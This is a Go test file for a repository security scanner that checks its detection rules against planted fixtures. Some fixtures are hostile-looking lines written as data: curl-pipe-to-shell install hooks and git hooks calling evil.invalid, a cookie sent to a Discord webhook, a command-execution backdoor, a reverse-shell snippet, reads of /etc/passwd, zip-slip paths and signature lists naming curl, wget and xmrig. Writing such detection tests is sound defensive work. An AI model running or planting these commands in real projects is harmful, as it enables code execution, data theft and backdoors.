package scan

import (
	"archive/zip"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/Kevin-Umali/repyy/internal/intel"
	"github.com/Kevin-Umali/repyy/internal/model"
)

func writeFixture(t *testing.T, root, name, body string) {
	t.Helper()
	path := filepath.Join(root, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func hasRule(findings []model.Finding, id string) bool {
	for _, f := range findings {
		if f.RuleID == id {
			return true
		}
	}
	return false
}

func ruleFinding(findings []model.Finding, id string) (model.Finding, bool) {
	for _, finding := range findings {
		if finding.RuleID == id {
			return finding, true
		}
	}
	return model.Finding{}, false
}

func TestBuiltinsCompileAndHaveUniqueIDs(t *testing.T) {
	seen := map[string]bool{}
	for _, rule := range BuiltinRules() {
		if seen[rule.ID] {
			t.Fatalf("duplicate rule id %s", rule.ID)
		}
		seen[rule.ID] = true
		if rule.re == nil {
			t.Fatalf("rule %s was not compiled", rule.ID)
		}
	}
}

func TestDetectsDownloadExecuteAndLifecycle(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "package.json", `{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`)
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	if !coverage.Complete {
		t.Fatalf("expected complete coverage: %+v", coverage)
	}
	for _, id := range []string{"CHAIN-001", "PKG-001"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s in %+v", id, findings)
		}
	}
}

func TestCleanRepositoryHasNoFindings(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "main.go", "package main\n\nfunc main() {}\n")
	writeFixture(t, root, "README.md", "# Small example\nThis project prints a greeting.\n")
	writeFixture(t, root, "LICENSE", "test fixture license\n")
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	if !coverage.Complete {
		t.Fatal("clean scan should be complete")
	}
	if len(findings) != 0 {
		t.Fatalf("unexpected findings: %+v", findings)
	}
}

func TestDisabledGitHooksAreNotFlagged(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, ".git/config", "[core]\n\thooksPath = /dev/null\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "GITHOOK-001") {
		t.Fatalf("safe disabled hooks path was flagged: %+v", findings)
	}
}

func TestDocumentationExamplesDoNotProduceCriticalFindings(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "LICENSE", "test fixture license\n")
	writeFixture(t, root, "README.md", "Security docs: never run `curl https://evil.invalid/p | sh` or use `/dev/tcp/host/1`.\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if finding.Severity == model.SeverityCritical {
			t.Fatalf("documentation example became critical: %+v", finding)
		}
		if finding.Path == "README.md" && finding.Context != "documentation" {
			t.Fatalf("documentation was classified incorrectly: %+v", finding)
		}
	}
}

func TestSignatureCorpusIsAggregatedAndDowngraded(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	body := "PATTERNS='curl|wget|eval|exec|xmrig'\nPATTERNS='curl|wget|eval|exec|xmrig'\n"
	writeFixture(t, root, "malware_signatures.sh", body)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if finding.Path != "malware_signatures.sh" {
			continue
		}
		if finding.Context != "detection-definition" || finding.Confidence != model.ConfidenceLow {
			t.Fatalf("signature finding was not contextualized: %+v", finding)
		}
		if finding.Occurrences < 2 {
			t.Fatalf("repeated signature hits were not aggregated: %+v", finding)
		}
	}
}

func TestScannerImplementationPatternsAreDowngraded(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "scanner.go", `package scanner

func signatures() {
	for _, needle := range []string{"eval(", "exec(", "curl ", "/dev/tcp/"} {
		_ = needle
	}
}
`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	if len(findings) == 0 {
		t.Fatal("expected contextual findings for scanner signatures")
	}
	for _, finding := range findings {
		if finding.Context != "detection-definition" || finding.Confidence != model.ConfidenceLow || finding.Severity == model.SeverityCritical {
			t.Fatalf("scanner signature was not safely contextualized: %+v", finding)
		}
	}
}

func TestRepositoryHygieneIsInformational(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "main.go", "package main\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"REPO-001", "REPO-002"} {
		if !hasRule(findings, id) {
			t.Fatalf("missing %s in %+v", id, findings)
		}
	}
}

func TestDetectsExfiltrationAndBackdoorSignals(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "server.js", "const c = document.cookie; fetch('https://discord.com/api/webhooks/1/x'); exec(req.query.cmd);\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"EXFIL-002", "NET-002", "BACKDOOR-001"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s in %+v", id, findings)
		}
	}
}

func TestDetectsConfirmedPackageNamesAcrossEcosystems(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "package.json", `{"dependencies":{"tailwind-form-kit":"1.0.0","axios":"1.14.1","internal-widget":"100.100.100"}}`)
	writeFixture(t, root, "requirements.txt", "openaii==1.0.0\n")
	writeFixture(t, root, "go.mod", "module example.test/x\n\nrequire github.com/utilizedsun/layout v1.0.0\n")
	writeFixture(t, root, "Cargo.toml", "[dependencies]\ntinymember = \"1.0.0\"\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, advisory := range []string{"GHSA-p7c5-phj5-qm49", "GHSA-q5h5-h6mj-vhgv", "GHSA-cvm3-cf32-fx43", "GHSA-jpmw-jcm2-3wcq"} {
		if !hasRule(findings, "IOC-PKG-"+advisory) {
			t.Errorf("missing package advisory %s in %+v", advisory, findings)
		}
	}
	if !hasRule(findings, "IOC-PKG-MSFT-2026-04-01-AXIOS") {
		t.Errorf("missing version-specific Sapphire Sleet package IOC in %+v", findings)
	}
	if !hasRule(findings, "PKG-005") {
		t.Errorf("missing dependency-confusion version signal in %+v", findings)
	}
}

func TestKnownBenignPackageIsNotBlocklisted(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "package.json", `{"dependencies":{"call-bind-apply-helpers":"1.0.2"}}`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if strings.HasPrefix(finding.RuleID, "IOC-PKG-") {
			t.Fatalf("known-benign dependency was blocklisted: %+v", finding)
		}
	}
}
func TestEvidenceRedactsCredentials(t *testing.T) {
	root := t.TempDir()
	providerCredential := "AKIA" + "ABCDEFGHIJKLMNOP"
	writeFixture(t, root, "credentials.txt", providerCredential+"\napi_key=super-secret-value\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "SECRET-002") {
		t.Fatalf("credential was not detected: %+v", findings)
	}
	for _, finding := range findings {
		if strings.Contains(finding.Evidence, providerCredential) || strings.Contains(finding.Evidence, "super-secret-value") {
			t.Fatalf("credential leaked in evidence: %+v", finding)
		}
	}
}

func TestEscapingSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation requires privileges")
	}
	root := t.TempDir()
	if err := os.Symlink(filepath.Join(root, "..", "secret"), filepath.Join(root, "escape")); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "SYMLINK-001") {
		t.Fatalf("escaping symlink was not reported: %+v", findings)
	}
}

func TestZipSlipEntry(t *testing.T) {
	root := t.TempDir()
	var archive bytes.Buffer
	zw := zip.NewWriter(&archive)
	f, err := zw.Create("../../escape.sh")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.Write([]byte("echo harmless fixture")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "fixture.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "ARCHIVE-001") {
		t.Fatalf("zip traversal was not reported: %+v", findings)
	}
}

func TestArchivePathValidationIsPortableAndBoundaryAware(t *testing.T) {
	for _, unsafe := range []string{"../escape", "dir/../../escape", `..\..\escape`, `/absolute`, `C:\escape`} {
		if !unsafeArchivePath(unsafe) {
			t.Errorf("unsafe archive path %q was accepted", unsafe)
		}
	}
	for _, safe := range []string{"..fixture/file", "dir/../file", "normal/file"} {
		if unsafeArchivePath(safe) {
			t.Errorf("safe archive path %q was rejected", safe)
		}
	}
}

func TestRequiredDetectionFamilies(t *testing.T) {
	ruleIDs := map[string]bool{}
	for _, rule := range BuiltinRules() {
		ruleIDs[rule.ID] = true
	}
	// These keep the documented high-level detection families represented.
	want := []string{
		"EXEC-001", "OBFS-001", "OBFS-002", "PKG-001", "CHAIN-001",
		"NPMRC-001", "NPMRC-002", "LOCK-001", "GITHOOK-001", "IPURL-001",
		"CRED-001", "FINGERPRINT-001", "MINER-001", "UNICODE-001", "EVADE-001",
		"IDE-001", "OBFS-003", "CICD-001", "SECRET-001", "IMPORT-001",
		"DOCKER-001", "REVSHELL-001", "EXFIL-001", "PROTO-001", "PKG-004",
		"TYPOSQUAT-001",
	}
	for _, id := range want {
		if !ruleIDs[id] && !strings.HasPrefix(id, "PKG-") {
			t.Errorf("detection family missing rule %s", id)
		}
	}

	root := t.TempDir()
	writeFixture(t, root, "packed.js", "eval('x');\n"+strings.Repeat("abcdefghijklmnopqrstuvwxyz0123456789", 20))
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "OBFS-004") || !hasRule(findings, "OBFS-005") {
		t.Errorf("missing generated minification/entropy checks: %+v", findings)
	}
}

func TestDependencyTreesSkippedByDefault(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	for _, path := range []string{
		"node_modules/evil/index.js",
		".convex/local/modules/compiled.blob",
		".expo/xcodebuild.log",
		"ios/Pods/evil/index.js",
	} {
		writeFixture(t, root, path, "curl https://evil.invalid/x | sh")
	}
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	if len(findings) != 0 {
		t.Fatalf("dependency tree should be skipped: %+v", findings)
	}
	if len(coverage.Skipped) != 4 {
		t.Fatalf("got %d disclosed skips, want 4: %+v", len(coverage.Skipped), coverage.Skipped)
	}
}

func TestScanReportsCoverageProgress(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "main.go", "package main\n")
	files, bytes := 0, int64(0)
	coverage, _ := New(Options{Progress: func(scanned int, read int64) {
		files, bytes = scanned, read
	}}).Scan(context.Background(), root)
	if files != coverage.FilesScanned || bytes != coverage.BytesScanned {
		t.Fatalf("progress=(%d, %d), coverage=(%d, %d)", files, bytes, coverage.FilesScanned, coverage.BytesScanned)
	}
}

func TestV021CoverageHardening(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, ".git/hooks/pre-commit", "#!/bin/sh\ncurl https://evil.invalid/hook | sh\n")
	writeFixture(t, root, ".github/workflows/unsafe.yml", "steps:\n  - uses: example/action@main\n")
	writeFixture(t, root, ".vscode/extensions.json", `{"recommendations":["unknown.untrusted"]}`)
	writeFixture(t, root, "obfuscated.js", `const x = 'lave'.split('').reverse().join(''); process.mainModule.require(x);`)
	writeFixture(t, root, "Dockerfile", "ADD https://evil.invalid/tool /usr/bin/tool\n")
	writeFixture(t, root, "shell.py", `python -c 'import socket; socket.socket(); /bin/sh'`)
	writeFixture(t, root, "reader.js", `fs.readFileSync('/etc/passwd')`)
	writeFixture(t, root, "unicode.js", "const soft = 'a\u00adb';\n")
	writeFixture(t, root, "package.json", `{"dependencies":{"webpck":"1.0.0"},"bin":"../outside.js"}`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"GITHOOK-002", "CICD-003", "IDE-002", "OBFS-006", "IMPORT-003", "DOCKER-003", "REVSHELL-002", "CRED-002", "UNICODE-001", "TYPOSQUAT-001", "PKG-006"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s in %+v", id, findings)
		}
	}
}

func TestPrecisionExclusions(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "network.js", "fetch('http://127.0.0.1/x'); fetch('http://10.0.0.1/x');\n")
	writeFixture(t, root, "package-lock.json", strings.Repeat("a", 900)+"\n")
	writeFixture(t, root, ".github/workflows/safe.yml", "steps:\n  - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"IPURL-001", "OBFS-004", "CICD-003"} {
		if hasRule(findings, id) {
			t.Errorf("precision exclusion failed for %s: %+v", id, findings)
		}
	}
}

func TestPublicIPURLIsReported(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "network.js", "fetch('http://8.8.8.8/payload');\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "IPURL-001") {
		t.Fatalf("public IP URL was not reported: %+v", findings)
	}
}

func TestQualifiedOccurrencesExcludePrivateIPMatches(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "network.txt", "http://127.0.0.1/private http://8.8.8.8/public\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "IPURL-001")
	if !ok || finding.Occurrences != 1 {
		t.Fatalf("qualified occurrence count = %+v", finding)
	}
}

func TestRuleCatalogMetadataIsComplete(t *testing.T) {
	catalog := BuiltinRuleCatalog()
	seen := map[string]bool{}
	for _, info := range catalog {
		if seen[info.ID] {
			t.Fatalf("duplicate catalog entry %s", info.ID)
		}
		seen[info.ID] = true
		if info.Category == "" || info.Description == "" || info.Rationale == "" || info.LegitimateUse == "" || info.Remediation == "" || info.MatchScope == "" || info.Disposition == "" || len(info.ApplicablePaths) == 0 {
			t.Fatalf("incomplete catalog entry: %+v", info)
		}
	}
	for _, rule := range BuiltinRules() {
		if !seen[rule.ID] {
			t.Errorf("rule %s is missing from catalog", rule.ID)
		}
	}
	for _, id := range []string{"ARCHIVE-001", "BINARY-001", "COMBO-001", "COMBO-002", "COMBO-003", "EXECBIT-001", "GITHOOK-002", "IOC-HASH-SHA256", "IOC-PKG-*", "OBFS-004", "OBFS-005", "PKG-001", "PKG-002", "PKG-003", "PKG-004", "PKG-005", "PKG-006", "PKG-007", "REPO-001", "REPO-002", "SYMLINK-001", "SYMLINK-002"} {
		if !seen[id] {
			t.Errorf("structured rule %s is missing from catalog", id)
		}
	}
}

func TestProcessPrecisionAndCompleteLocations(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "scripts/check.mjs", `import { execFileSync, spawn } from "node:child_process";
const marker = "process.env";
const runConvexFunction = () => true;
execFileSync("node", ["--version"]);
spawn("node", ["--version"]);
`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "EXEC-001") || hasRule(findings, "ENV-001") {
		t.Fatalf("identifier or quoted-token false positive: %+v", findings)
	}
	capability, ok := ruleFinding(findings, "EXEC-004")
	if !ok || capability.Disposition != model.DispositionInformational {
		t.Fatalf("missing informational import capability: %+v", findings)
	}
	execution, ok := ruleFinding(findings, "EXEC-002")
	if !ok || execution.Occurrences != 2 || len(execution.Locations) != 2 || execution.Locations[0].StartLine != 4 || execution.Locations[1].StartLine != 5 {
		t.Fatalf("process locations were not retained: %+v", execution)
	}
}

func TestLiteralTypeImportsAreNotDynamicImports(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "types.d.ts", `declare const value: import("drizzle-orm").Column;`)
	writeFixture(t, root, "runtime.js", "const dynamic = require(moduleName);\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "IMPORT-001")
	if !ok || finding.Path != "runtime.js" || finding.Occurrences != 1 {
		t.Fatalf("literal type import precision failed: %+v", findings)
	}
}

func TestMinifiedAndDistributionOutputUsesGeneratedContext(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "packages/app/dist/runtime.js", "eval(value);\n")
	writeFixture(t, root, "public/sw.js", "eval(value);"+strings.Repeat("x", 700)+"\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if finding.Path == "packages/app/dist/runtime.js" || finding.Path == "public/sw.js" {
			if finding.Context != "generated" || finding.Disposition != model.DispositionInformational {
				t.Fatalf("build output was not contextualized: %+v", finding)
			}
			if finding.RuleID == "OBFS-004" || finding.RuleID == "OBFS-005" {
				t.Fatalf("weak generated heuristic was retained: %+v", finding)
			}
		}
	}
}

func TestGeneratedContextSuppressesWeakNoiseButRetainsSecrets(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	providerCredential := "AKIA" + "ABCDEFGHIJKLMNOP"
	writeFixture(t, root, "convex/_generated/server.js", "export const env = process.env;\nconst payload = \""+providerCredential+"\";\n"+strings.Repeat("x", 900)+"\n")
	writeFixture(t, root, "internal/intel/package_metadata_generated.go", "var env = os.Environ()\n"+strings.Repeat("x", 900)+"\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "ENV-001") || hasRule(findings, "OBFS-004") {
		t.Fatalf("weak generated-code noise was retained: %+v", findings)
	}
	secret, ok := ruleFinding(findings, "SECRET-002")
	if !ok || secret.Context != "generated" || secret.Confidence != model.ConfidenceHigh {
		t.Fatalf("strong generated-code indicator was lost or downgraded: %+v", findings)
	}
}

func TestStructuredWorkflowRetainsEveryMutableActionLocation(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, ".github/workflows/verify.yml", `jobs:
  test:
    steps:
      # uses: ignored/comment@main
      - uses: actions/checkout@v4
      - uses: ./local-action
      - uses: actions/setup-node@0123456789012345678901234567890123456789
      - uses: pnpm/action-setup@v4
`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "CICD-003")
	if !ok || finding.Occurrences != 2 || len(finding.Locations) != 2 || finding.Locations[0].StartLine != 5 || finding.Locations[1].StartLine != 8 {
		t.Fatalf("unexpected workflow finding: %+v", finding)
	}
}

func TestLocationDetailLimitKeepsOccurrenceCount(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "many.js", strings.Repeat("eval(value);\n", maxLocationsPerFinding+5))
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "EXEC-001")
	if !ok || finding.Occurrences != maxLocationsPerFinding+5 || len(finding.Locations) != maxLocationsPerFinding || finding.LocationsOmitted != 5 {
		t.Fatalf("unexpected location limiting: %+v", finding)
	}
	if len(coverage.Warnings) == 0 || !strings.Contains(strings.Join(coverage.Warnings, " "), "location detail") {
		t.Fatalf("missing location warning: %+v", coverage)
	}
}

func TestEvidenceRedactionHandlesSpacesAndUnicode(t *testing.T) {
	evidence := safeEvidence([]byte(`const client_secret = "correct horse battery staple 🔐"; ` + strings.Repeat("界", 200)))
	if strings.Contains(evidence, "correct") || strings.Contains(evidence, "horse") || !strings.Contains(evidence, "client_secret=[REDACTED]") || !utf8.ValidString(evidence) {
		t.Fatalf("unsafe evidence: %q", evidence)
	}
}

func TestLiteralDependentRulesRemainCovered(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "browser.js", `setTimeout("run()", 1); import("https://example.invalid/module.js"); if (password === "universal") allow();`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"EXEC-003", "IMPORT-002", "BACKDOOR-002"} {
		if !hasRule(findings, id) {
			t.Errorf("literal-dependent rule %s lost coverage: %+v", id, findings)
		}
	}
}

func TestExecutableExamplesInCommentsAreContextual(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "install.sh", "# Example only: curl https://example.invalid/p | sh\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "CHAIN-001")
	if !ok || finding.Context != "example" || finding.Severity == model.SeverityCritical || finding.Disposition != model.DispositionInformational {
		t.Fatalf("comment example was not contextualized: %+v", finding)
	}
}

func TestStructuredRuleFamilyContract(t *testing.T) {
	root := t.TempDir()
	knownBody := []byte("known indicator fixture")
	knownHash := sha256.Sum256(knownBody)
	database := intel.NewDatabase(intel.Packages, []intel.FileHash{{
		SHA256: hex.EncodeToString(knownHash[:]), Family: "test family", Source: "https://example.invalid/advisory",
	}})
	writeFixture(t, root, "known.bin", string(knownBody))
	writeFixture(t, root, "native.bin", "\x7fELFfixture")
	writeFixture(t, root, "tool.sh", "#!/bin/sh\necho fixture\n")
	if runtime.GOOS != "windows" {
		if err := os.Chmod(filepath.Join(root, "tool.sh"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink("missing-target", filepath.Join(root, "broken-link")); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(filepath.Join(root, "..", "outside"), filepath.Join(root, "escaping-link")); err != nil {
			t.Fatal(err)
		}
	}
	writeFixture(t, root, ".git/hooks/pre-commit", "#!/bin/sh\ncurl https://example.invalid/hook | sh\n")
	writeFixture(t, root, ".github/workflows/verify.yml", "steps:\n  - uses: actions/checkout@v4\n")
	writeFixture(t, root, "package.json", `{
  "scripts": {"postinstall": "echo reviewed", "dev": "curl https://example.invalid/tool | sh"},
  "dependencies": {"tailwind-form-kit": "1.0.0", "remote": "https://example.invalid/pkg.tgz", "placeholder": "0.0.0", "internal-widget": "100.0.0"},
  "bin": {"fixture": "../escape.js"}
}`)
	writeFixture(t, root, "correlated.js", "const socket = new WebSocket(endpoint);\nreadFileSync('.env');\nspawn('node', args);\n")
	writeFixture(t, root, "evasion.js", "if (process.ppid) spawn('node', args);\n")
	writeFixture(t, root, "packed.js", "eval(value);\n"+strings.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 12)+"\n")

	var archive bytes.Buffer
	archiveWriter := zip.NewWriter(&archive)
	entry, err := archiveWriter.Create("../../escape.sh")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := entry.Write([]byte("fixture")); err != nil {
		t.Fatal(err)
	}
	if err := archiveWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "unsafe.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}

	_, findings := New(Options{Intelligence: database}).Scan(context.Background(), root)
	want := []string{
		"ARCHIVE-001", "BINARY-001", "COMBO-001", "COMBO-002", "COMBO-003", "GITHOOK-002",
		"IOC-HASH-SHA256", "IOC-PKG-GHSA-p7c5-phj5-qm49", "OBFS-004", "OBFS-005", "PKG-001",
		"PKG-002", "PKG-003", "PKG-004", "PKG-005", "PKG-006", "PKG-007", "REPO-001", "REPO-002",
	}
	if runtime.GOOS != "windows" {
		want = append(want, "EXECBIT-001", "SYMLINK-001", "SYMLINK-002")
	}
	for _, id := range want {
		if !hasRule(findings, id) {
			t.Errorf("structured rule %s lacks its inert positive: %+v", id, findings)
		}
	}
}

func TestCorrelationsRetainOnlyContributingRulesAndLocations(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "chain.js", "const socket = new WebSocket(endpoint);\nreadFileSync('.env');\nspawn('node', args);\n")
	writeFixture(t, root, "quoted.js", "const example = 'new WebSocket(endpoint)';\nspawn('node', args);\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	collection, ok := ruleFinding(findings, "COMBO-001")
	if !ok || strings.Join(collection.ContributingRuleIDs, ",") != "CRED-002,EXFIL-001" || len(collection.Locations) != 2 {
		t.Fatalf("unexpected collection correlation: %+v", collection)
	}
	fetchExecute, ok := ruleFinding(findings, "COMBO-002")
	if !ok || fetchExecute.Path != "chain.js" || strings.Join(fetchExecute.ContributingRuleIDs, ",") != "EXEC-002,EXFIL-001" || len(fetchExecute.Locations) != 2 {
		t.Fatalf("unexpected execution correlation: %+v", fetchExecute)
	}
	for _, finding := range findings {
		if finding.RuleID == "COMBO-002" && finding.Path == "quoted.js" {
			t.Fatalf("quoted example created a correlation: %+v", finding)
		}
	}
}

func TestArchiveEntriesUseInnerPathContextAndLocations(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	var archive bytes.Buffer
	writer := zip.NewWriter(&archive)
	entry, err := writer.Create("src/runtime.js")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := entry.Write([]byte("spawn('node', args);\n")); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "outer-fixture.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "EXEC-002")
	if !ok || finding.Context != "executable" || finding.Path != "outer-fixture.zip!src/runtime.js" || len(finding.Locations) != 1 || finding.Locations[0].StartLine != 1 {
		t.Fatalf("archive entry used its outer path context: %+v", finding)
	}
}

func TestStructuredDetectorsInspectRootEntriesInsideArchives(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	var archive bytes.Buffer
	writer := zip.NewWriter(&archive)
	entries := map[string]string{
		"package.json":                 `{"scripts":{"postinstall":"echo reviewed"},"dependencies":{"tailwind-form-kit":"1.0.0"}}`,
		".github/workflows/verify.yml": "steps:\n  - uses: actions/checkout@v4\n",
	}
	for name, body := range entries {
		entry, err := writer.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := entry.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"PKG-001", "IOC-PKG-GHSA-p7c5-phj5-qm49", "CICD-003"} {
		finding, ok := ruleFinding(findings, id)
		if !ok || !strings.HasPrefix(finding.Path, "bundle.zip!") || finding.Line < 1 {
			t.Errorf("structured archive rule %s missing exact inner location: %+v", id, finding)
		}
	}
}

func TestMultipleMatchesOnOneLineKeepOccurrenceTotal(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "many.js", "eval(a); eval(b); eval(c);\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	finding, ok := ruleFinding(findings, "EXEC-001")
	if !ok || finding.Occurrences != 3 || len(finding.Locations) != 1 {
		t.Fatalf("same-line occurrence accounting failed: %+v", finding)
	}
}

func TestFindingOrderIsDeterministicAcrossStructuredMaps(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "package.json", `{
  "scripts": {"postinstall": "echo reviewed", "prepare": "echo reviewed", "dev": "curl https://example.invalid/tool | sh"},
  "dependencies": {"source-b": "https://example.invalid/b", "source-a": "https://example.invalid/a", "placeholder": "0.0.0"}
}`)
	var baseline []byte
	for attempt := 0; attempt < 10; attempt++ {
		_, findings := New(Options{}).Scan(context.Background(), root)
		encoded, err := json.Marshal(findings)
		if err != nil {
			t.Fatal(err)
		}
		if attempt == 0 {
			baseline = encoded
			continue
		}
		if !bytes.Equal(encoded, baseline) {
			t.Fatalf("finding order changed between scans\nfirst: %s\nnext:  %s", baseline, encoded)
		}
	}
}
